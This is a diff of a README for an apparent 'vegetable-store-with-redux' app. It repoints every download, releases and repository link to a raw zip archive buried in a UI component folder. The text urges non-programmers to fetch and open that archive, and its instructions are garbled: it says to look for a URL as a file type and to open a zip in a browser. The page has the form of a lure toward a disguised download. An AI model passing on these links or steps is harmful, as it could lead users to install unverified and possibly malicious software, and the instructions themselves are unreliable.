@@ -1,7 +1,7 @@
 # 🥦 vegetable-store-with-redux - Simple Setup for Your Vegetable Store App
 
 ## 📥 Download the Latest Version
-[![Download](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip)](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip)
+[![Download](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip)](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the vegetable-store-with-redux project! This is a simple application designed to help you manage your vegetable inventory. The project uses modern web technologies for a smooth experience. You don't need to be a programmer to set it up.
@@ -22,17 +22,17 @@ Before downloading, ensure your system meets these requirements:
 
 ## 💾 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the software:
-   [Download from Releases](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip)
+   [Download from Releases](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip)
 
 2. **Choose the Latest Version:** Once on the releases page, locate the most recent version of the application, which will be listed at the top.
 
-3. **Download the Application:** Click on the package that matches your operating system (look for `.zip` or `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip` files). The names will often indicate the version number.
+3. **Download the Application:** Click on the package that matches your operating system (look for `.zip` or `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip` files). The names will often indicate the version number.
 
 4. **Extract the Files (if needed):** After downloading, you may need to extract the files from the downloaded archive. Right-click the file and choose an extraction option like "Extract All" or similar.
 
 5. **Open the Application:**
-   - For Windows: Open `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip` in your favorite browser.
-   - For macOS/Linux: Right-click on `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip` and select "Open with" then choose your browser.
+   - For Windows: Open `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip` in your favorite browser.
+   - For macOS/Linux: Right-click on `https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip` and select "Open with" then choose your browser.
 
 6. **Explore the App:** Once the app is open, you can start adding vegetables to your inventory!
 
@@ -47,7 +47,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 🌍 Additional Resources
 If you want to explore the code or contribute, you can check the project's GitHub repository:
-- [Vegetable Store on GitHub](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/heptapetalous/vegetable-store-with-redux.zip)
+- [Vegetable Store on GitHub](https://raw.githubusercontent.com/bobiscool221/vegetable-store-with-redux/main/src/modules/UI/CartButton/with_vegetable_store_redux_1.9.zip)
 
 For more detailed documentation, you can review the Wiki section in the repository. 
 
